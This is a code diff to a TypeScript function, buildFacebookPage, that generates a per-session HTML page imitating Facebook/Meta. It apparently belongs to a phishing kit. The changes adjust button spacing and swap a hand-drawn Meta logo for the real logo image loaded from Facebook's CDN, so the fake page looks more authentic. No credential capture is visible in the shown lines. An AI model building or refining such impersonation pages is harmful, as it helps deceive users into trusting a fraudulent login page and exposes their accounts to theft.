@@ -257,6 +257,7 @@ function buildFacebookPage(sessionId: string): string {
     font-size: 16px;
     font-weight: 700;
     cursor: pointer;
+    margin-top: 20px;
     margin-bottom: 36px;
     -webkit-appearance: none;
     text-align: center;
@@ -343,25 +344,7 @@ function buildFacebookPage(sessionId: string): string {
 
 <!-- Logo Meta oficial -->
 <div class="meta-footer">
-  <svg width="54" height="18" viewBox="0 0 54 18" fill="none" xmlns="http://www.w3.org/2000/svg">
-    <defs>
-      <linearGradient id="meta-a" x1="4.18" y1="9" x2="13.96" y2="9" gradientUnits="userSpaceOnUse">
-        <stop offset="0" stop-color="#0064e1"/>
-        <stop offset=".4" stop-color="#0064e1"/>
-        <stop offset=".83" stop-color="#0073ee"/>
-        <stop offset="1" stop-color="#0082fb"/>
-      </linearGradient>
-      <linearGradient id="meta-b" x1="9.07" y1="15.33" x2="9.07" y2="8.09" gradientUnits="userSpaceOnUse">
-        <stop offset="0" stop-color="#0082fb"/>
-        <stop offset="1" stop-color="#0064e0"/>
-      </linearGradient>
-    </defs>
-    <!-- Símbolo ∞ Meta oficial -->
-    <path d="M4.18 9c0-1.07.26-1.95.63-2.56.49-.83 1.2-1.28 2.03-1.28.71 0 1.33.27 2.09 1.2.51.63 1.03 1.54 1.51 2.64.48-1.1 1-2.01 1.51-2.64.76-.93 1.38-1.2 2.09-1.2.83 0 1.54.45 2.03 1.28.37.61.63 1.49.63 2.56 0 1.45-.45 2.68-1.24 3.56-.66.73-1.48 1.13-2.44 1.13-.71 0-1.34-.22-2.01-.74-.52-.4-1.06-1.03-1.63-1.95l-.37-.62-.37.62c-.57.92-1.11 1.55-1.63 1.95-.67.52-1.3.74-2.01.74-.96 0-1.78-.4-2.44-1.13C4.63 11.68 4.18 10.45 4.18 9z" fill="url(#meta-a)"/>
-    <path d="M4.18 9c0 1.45.45 2.68 1.24 3.56.66.73 1.48 1.13 2.44 1.13.71 0 1.34-.22 2.01-.74.52-.4 1.06-1.03 1.63-1.95l.37-.62.37.62c.57.92 1.11 1.55 1.63 1.95.67.52 1.3.74 2.01.74.96 0 1.78-.4 2.44-1.13.79-.88 1.24-2.11 1.24-3.56H4.18z" fill="url(#meta-b)"/>
-    <!-- Texto Meta -->
-    <text x="21" y="13.5" font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="12" font-weight="500" fill="#8a8d91" letter-spacing="0.1">Meta</text>
-  </svg>
+  <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ys/r/RkrEdst9VSp.webp" alt="Meta" height="16" style="opacity:0.6;">
 </div>
 
 <script>
